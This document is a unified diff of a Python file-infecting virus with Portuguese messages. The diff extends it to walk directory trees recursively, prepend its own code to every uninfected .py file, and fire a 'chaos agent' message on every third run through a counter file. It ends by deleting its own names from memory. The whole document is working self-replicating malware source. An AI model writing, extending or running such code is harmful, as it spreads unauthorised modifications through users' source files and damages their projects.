@@ -1,84 +1,93 @@
 # begin-virus
 
 import glob
-
+import os
 
 def find_files_to_infect(directory="."):
-    return [file for file in glob.glob("*.py")]
-
+    python_files = []
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if file.endswith(".py"):
+                python_files.append(os.path.join(root, file))
+    return python_files
 
 def get_content_of_file(file):
-    data = None
     with open(file, "r") as my_file:
         data = my_file.readlines()
-
     return data
 
+def is_infected(file):
+    data = get_content_of_file(file)
+    return any("# begin-virus" in line for line in data)
 
 def get_content_if_infectable(file):
     data = get_content_of_file(file)
-    for line in data:
-        if "# begin-virus" in line:
-            return None
-    return data
-
+    if not is_infected(file):
+        return data
+    return None
 
 def infect(file, virus_code):
-    if data := get_content_if_infectable(file):
-        with open(file, "w") as infected_file:
-            infected_file.write("".join(virus_code))
-            infected_file.writelines(data)
-
+    if not is_infected(file):
+        with open(file, "r+") as infected_file:
+            content = infected_file.read()
+            infected_file.seek(0)
+            infected_file.write(virus_code + content)
 
 def get_virus_code():
     virus_code_on = False
     virus_code = []
 
-    code = get_content_of_file(__file__)
+    with open(__file__, "r") as code_file:
+        for line in code_file:
+            if "# begin-virus" in line:
+                virus_code_on = True
+            if virus_code_on:
+                virus_code.append(line)
+            if "# end-virus\n" in line:
+                virus_code_on = False
+                break
 
-    for line in code:
-        if "# begin-virus\n" in line:
-            virus_code_on = True
-
-        if virus_code_on:
-            virus_code.append(line)
-
-        if "# end-virus\n" in line:
-            virus_code_on = False
-            break
-
-    return virus_code
-
+    return "".join(virus_code)
 
 def summon_chaos():
-    print(
-        "Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\n Eu sou o agente do caos! "
-    )
+    print("Introduza um pouco de anarquia, desestabilize a ordem e tudo se transformará em caos.\nEu sou o agente do caos!")
 
+def update_execution_count():
+    contador_arquivo = "executions_count.txt"
+    try:
+        with open(contador_arquivo, "r") as contador:
+            count = int(contador.read().strip())
+    except FileNotFoundError:
+        count = 0
 
-# entry point
+    count += 1
 
+    if count == 3:
+        count = 0
+        summon_chaos()
 
-try:
-    # retrieve the virus code from the current infected script
-    virus_code = get_virus_code()
+    with open(contador_arquivo, "w") as contador:
+        contador.write(str(count))
 
-    # look for other files to infect
-    for file in find_files_to_infect():
-        infect(file, virus_code)
+if __name__ == "__main__":
+    try:
+        # Retrieve the virus code from the current infected script
+        virus_code = get_virus_code()
 
-    # call the payload
-    summon_chaos()
+        # Look for other files to infect
+        for file in find_files_to_infect():
+            infect(file, virus_code)
 
-# except:
-#     pass
+        # Update execution count and potentially trigger summon_chaos
+        update_execution_count()
 
-finally:
-    # delete used names from memory
-    for i in list(globals().keys()):
-        if i[0] != "_":
-            exec("del {}".format(i))
+    except Exception as e:
+        print(f"Ocorreu um erro: {e}")
 
-    del i
+    finally:
+        # Delete used names from memory
+        for name in list(globals().keys()):
+            if name[0] != "_":
+                del globals()[name]
 
 # end-virus
